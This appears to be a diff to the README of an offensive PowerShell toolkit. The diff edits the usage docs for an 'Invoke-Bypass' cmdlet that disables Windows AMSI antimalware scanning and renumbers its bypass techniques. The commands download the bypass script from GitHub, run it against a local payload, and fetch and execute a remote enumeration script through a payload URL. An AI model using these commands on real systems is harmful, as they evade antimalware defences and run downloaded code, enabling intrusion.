@@ -39,7 +39,7 @@ Disable-Amsi -DontDisableBlockLogging
    
 |Cmdlet Name|Description|Privileges|Notes|
 |---|---|---|---|
-|Invoke-Bypass|disable AMSI within current process using well known techniques</i></b>|User Land|4 bypass technics available|
+|Invoke-Bypass|disable AMSI within current process using well known techniques</i></b>|User Land|3 bypass technics available|
 
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Invoke-Bypass.ps1" -OutFile "Invoke-Bypass.ps1"
@@ -47,8 +47,8 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-B
 
 ```powershell      
 .\Invoke-Bypass.ps1 -list "technic"
-.\Invoke-Bypass.ps1 -technic "2"
-.\Invoke-Bypass.ps1 -technic "3" -filepath "payload.ps1"
-.\Invoke-Bypass.ps1 -technic "4" -filepath "payload.ps1" -fileargs "-action 'true'"
+.\Invoke-Bypass.ps1 -technic "1"
+.\Invoke-Bypass.ps1 -technic "2" -filepath "payload.ps1"
+.\Invoke-Bypass.ps1 -technic "3" -filepath "payload.ps1" -fileargs "-action 'true'"
 .\Invoke-Bypass.ps1 -technic "2" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
 ```   
